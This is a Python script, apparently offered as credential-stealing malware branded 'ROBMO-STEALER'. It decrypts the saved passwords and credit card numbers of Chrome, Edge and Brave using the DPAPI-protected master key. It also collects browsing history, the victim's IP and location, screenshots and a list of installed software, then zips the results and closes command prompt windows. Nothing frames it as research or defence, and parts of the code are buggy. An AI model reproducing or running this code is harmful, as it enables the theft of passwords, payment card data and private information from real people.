import base64
import getpass
import json
import os
import psutil
import random
import re
import requests
import shutil
import socket
import ctypes
import sqlite3
import telegram
import ssl
import zipfile
import platform
import subprocess
import PIL
import sys
import time
import uuid
import pyautogui
import urllib
import requests_toolbelt

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from json import loads
from datetime import datetime, timedelta
from email import encoders
from email.mime.base import MIMEBase
from json import loads as json_loads, load
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import cpu_count
from PIL import ImageGrab
from urllib.request import Request, urlopen
from requests_toolbelt.multipart.encoder import MultipartEncoder
from shutil import copy2
from sys import executable
from telegram import Bot, InputFile
from sqlite3 import connect as sql_connect
from win32crypt import CryptUnprotectData
from zipfile import ZIP_DEFLATED, ZipFile



appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'CHROME': appdata + '\\Google\\Chrome\\User Data',
    'EDGE': appdata + '\\Microsoft\\Edge\\User Data',
    'BRAVE': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
}

data_queries = {
    'Passwords': {
        'query': 'SELECT origin_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'Credit Cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'History': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'Downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, type_of_data, content):
    user_folder = os.path.join("C:\\Users", os.getenv("USERNAME"), "Downloads", "LOGINS", browser_name)
    if not os.path.exists(user_folder):
        os.makedirs(user_folder, exist_ok=True)
    
    if content is not None:
        file_path = os.path.join(user_folder, f"{type_of_data}.txt")
        inicio = """
╔════════════════════════════════════════════════════════╗

░█▀▄░█▀█░█▀▄░█▄█░█▀█░░░░░░░░░█▀▀░▀█▀░█▀▀░█▀█░█░░░█▀▀░█▀▄
░█▀▄░█░█░█▀▄░█░█░█░█░░░▄▄▄░░░▀▀█░░█░░█▀▀░█▀█░█░░░█▀▀░█▀▄
░▀░▀░▀▀▀░▀▀░░▀░▀░▀▀▀░░░░░░░░░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀

        𝙱𝚈:  @𝚁𝙾𝙱𝙼𝙾𝟶𝟶𝟶𝟽

╚════════════════════════════════════════════════════════╝
"""
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(inicio.strip() + "\n\n" + content)


save_results("CHROME", "Passwords", "Contenido del archivo...")




def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'History':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)

def getip():
    ip = "None"
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()    
    return ip

def globalinfo():
    ip = getip()
    
    username = os.getenv("USERNAME")

    ipdatajson = urlopen(Request(f"https://ipinfo.io/json")).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipdatajson)

    city = ipdata["city"]
    region = ipdata["region"]
    country = ipdata["country"]
    timezone = ipdata["timezone"]

    now = datetime.now()
    date = now.strftime("%Y-%m-%d")
    time = now.strftime("%H:%M:%S")

    globalinfo = f"\n➤ User: {username}\n➤ IP: {ip}\n➤ City: {city}\n➤ Region: {region}\n➤ Country: {country}\n➤ TimeZone: {timezone}\n➤ Date: {date}\n➤ Time: {time}"
    
    return globalinfo

def guardarinfo():
    user_info = globalinfo()
    user_folder = os.path.join("C:\\Users", os.getenv("USERNAME"), "Downloads", "LOGINS")
    
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)
    
    file_path = os.path.join(user_folder, "User Info.txt")
    inicio = """
╔════════════════════════════════════════════════════════╗

░█▀▄░█▀█░█▀▄░█▄█░█▀█░░░░░░░░░█▀▀░▀█▀░█▀▀░█▀█░█░░░█▀▀░█▀▄
░█▀▄░█░█░█▀▄░█░█░█░█░░░▄▄▄░░░▀▀█░░█░░█▀▀░█▀█░█░░░█▀▀░█▀▄
░▀░▀░▀▀▀░▀▀░░▀░▀░▀▀▀░░░░░░░░░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀

        𝙱𝚈:  @𝚁𝙾𝙱𝙼𝙾𝟶𝟶𝟶𝟽
        
╚════════════════════════════════════════════════════════╝
"""
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(inicio.strip() + "\n\n" + user_info) 

guardarinfo()

def systeminfo():
    computer_name = os.getenv('COMPUTERNAME')

    os_version = platform.system() + " " + platform.release()

    total_memory_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)

    cpu_info = platform.processor()

    system_type = platform.architecture()[0]

    system_info = f"\n➤ Computer Name: {computer_name}\n➤ OS: {os_version}\n➤ Total Memory: {total_memory_gb} GB\n➤ CPU: {cpu_info}\n➤ System Type: {system_type}"

    return system_info

def guardar():
    system_info = systeminfo()
    user_folder = os.path.join("C:\\Users", os.getenv("USERNAME"), "Downloads", "LOGINS")
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)
    
    file_path = os.path.join(user_folder, "System Info.txt")
    inicio = """
╔════════════════════════════════════════════════════════╗

░█▀▄░█▀█░█▀▄░█▄█░█▀█░░░░░░░░░█▀▀░▀█▀░█▀▀░█▀█░█░░░█▀▀░█▀▄
░█▀▄░█░█░█▀▄░█░█░█░█░░░▄▄▄░░░▀▀█░░█░░█▀▀░█▀█░█░░░█▀▀░█▀▄
░▀░▀░▀▀▀░▀▀░░▀░▀░▀▀▀░░░░░░░░░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀

        𝙱𝚈:  @𝚁𝙾𝙱𝙼𝙾𝟶𝟶𝟶𝟽

╚════════════════════════════════════════════════════════╝
"""
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(inicio.strip() + "\n\n" + system_info) 

guardar()

def get_user_info():
    response = requests.get("https://ipinfo.io/json")
    data = response.json()
    
    user = os.getenv("USERNAME")
    country = data.get("country", "Unknown")
    
    return user, country

def create_zip_file():
    user, country = get_user_info()
    
    now = datetime.now()
    date = now.strftime('%Y%m%d')
    time = now.strftime('%H%M%S')
    
    zip_filename = f'{user}[{time}][{country}][{date}].zip'
    
    logins_folder = os.path.join("C:\\Users", user, "Downloads", "LOGINS")
    
    if os.path.exists(logins_folder):
        zip_filepath = os.path.join("C:\\Users", user, "Downloads", zip_filename)
        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(logins_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, logins_folder)
                    zipf.write(file_path, arcname)
    
def screenshots(interval, num_screenshots, output_folder):
    screenshots_folder = os.path.join(output_folder, "Screenshots")
    
    if not os.path.exists(screenshots_folder):
        os.makedirs(screenshots_folder)

    for i in range(num_screenshots):
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%m-%d-%M-%S")
        filename = f"Screenshot-{timestamp}.png"
        screenshot_path = os.path.join(screenshots_folder, filename)
        screenshot.save(screenshot_path)
        time.sleep(interval)

def get_folders_in_path(path):
    folder_names = []
    with os.scandir(path) as entries:
        for entry in entries:
            if entry.is_dir():
                folder_names.append(entry.name)
    return folder_names

def save_list_to_txt(file_name, folder_list, output_folder):
    file_path = os.path.join(output_folder, file_name)
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write("╔════════════════════════════════════════════════════════╗\n")
        file.write("\n")
        file.write("░█▀▄░█▀█░█▀▄░█▄█░█▀█░░░░░░░░░█▀▀░▀█▀░█▀▀░█▀█░█░░░█▀▀░█▀▄\n")
        file.write("░█▀▄░█░█░█▀▄░█░█░█░█░░░▄▄▄░░░▀▀█░░█░░█▀▀░█▀█░█░░░█▀▀░█▀▄\n")
        file.write("░▀░▀░▀▀▀░▀▀░░▀░▀░▀▀▀░░░░░░░░░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀\n")
        file.write("\n")    
        file.write("        𝙱𝚈:  @𝚁𝙾𝙱𝙼𝙾𝟶𝟶𝟶𝟽\n")
        file.write("\n")
        file.write("╚════════════════════════════════════════════════════════╝\n")
        file.write("\n")

        for index, folder_name in enumerate(folder_list, start=1):
            file.write(f"{index}) {folder_name}\n")

def close_cmd():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if "cmd.exe" in process.info['name']:
            try:
                cmd_process = psutil.Process(process.info['pid'])
                cmd_process.terminate()
            except psutil.NoSuchProcess:
                pass

if __name__ == '__main__':
    interval_seconds = 1
    num_screenshots = 2
    output_folder = os.path.join("C:\\Users", os.getenv("USERNAME"), "Downloads", "LOGINS")
    min(output_folder)
    screenshots(interval_seconds, num_screenshots, output_folder)
    program_files_path = "C:\\Program Files"
    program_data_path = "C:\\ProgramData"
    folder_names_program_files = get_folders_in_path(program_files_path)
    folder_names_program_data = get_folders_in_path(program_data_path)
    all_folder_names = folder_names_program_files + folder_names_program_data
    save_list_to_txt("Program Files.txt", folder_names_program_files, output_folder)
    save_list_to_txt("Program Data.txt", folder_names_program_data, output_folder)
    create_zip_file()
    close_cmd()